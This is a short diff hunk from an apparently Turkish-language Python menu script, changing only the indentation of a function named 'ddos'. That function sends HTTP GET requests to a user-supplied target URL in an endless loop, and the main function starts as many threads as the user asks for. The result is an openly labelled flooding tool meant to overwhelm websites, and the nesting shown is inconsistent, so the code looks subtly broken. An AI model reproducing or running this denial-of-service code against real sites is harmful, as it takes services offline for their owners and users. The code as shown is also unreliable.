@@ -312,16 +312,16 @@ if(dil == "1"):
       def ddos(target):
        while True:
         try:
-            requests.get(target)
+         requests.get(target)
         except:
-            pass
+         pass
         def main():
          target = input('Enter target URL: ')
          thread_count = int(input('Enter number of threads: '))
          for _ in range(thread_count):
           threading.Thread(target=ddos, args=(target,)).start()
-         if __name__ == '__main__':
-          main()
+          if __name__ == '__main__':
+           main()
            
 
  elif secim == '4':
